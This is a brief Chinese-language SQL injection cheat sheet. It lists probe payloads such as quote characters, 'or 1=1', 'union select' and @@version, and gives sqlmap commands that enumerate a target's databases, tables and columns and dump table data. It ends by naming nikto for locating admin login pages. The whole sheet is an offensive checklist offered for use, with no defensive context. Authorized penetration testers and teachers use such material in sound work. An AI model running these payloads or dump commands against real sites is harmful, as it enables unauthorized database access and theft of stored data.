# SQL 注入

## 探测到底是不是通过拼接字符串方式使用 SQL

- 常用字符：

```
'
"
' and 1=1
' and 1=2
1 or 1=1
1' or '1'='1
1" or "1"="1
1' order by 1--
union select 1,2--
@@version
@@datadir
user()
database()
information_schema.tables

```


## sqlmap 分析数据库和表名、dump 表数据

- 获取数据库和服务器信息：`sqlmap -u 目标网址 --dbs --current-user`
- 获取有几张表：`sqlmap -u 目标网址 --tables`
- 获取指定表的字段有哪些：`sqlmap -u 目标网址 -T 表名 --columns`
- 获取指定表有哪些值：`sqlmap -u 目标网址 -T 表名 -C 字段名1,字段名2,字段名3 --dump`


## 分析登录后台入口

- nikto
